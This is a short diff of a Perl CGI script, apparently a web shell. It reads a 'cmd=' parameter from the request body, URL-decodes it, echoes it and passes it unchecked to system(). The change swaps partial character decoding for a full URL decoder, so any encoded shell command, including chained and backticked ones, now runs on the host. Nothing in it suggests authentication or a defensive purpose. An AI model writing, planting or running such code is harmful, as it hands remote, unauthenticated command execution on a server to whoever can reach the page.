@@ -12,12 +12,13 @@ MARK
 # TODO: running this inside another shell (not sh/bash) might help?
 
 $cmd = <STDIN>;
-$cmd=~s/^cmd=//isg;
-
-# TODO: url unencode in general?
-$cmd=~s/\+/ /isg;
-$cmd=~s/%3B/;/isg;
-$cmd=~s/%60/`/isg;
-
+$cmd =~s/^cmd=//isg;
+$cmd = urldecode($cmd);
 print "Running: $cmd<p>";
 system($cmd);
+
+sub urldecode {
+  my($str) = @_;
+  $str=~s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/iseg;
+  return $str;
+}
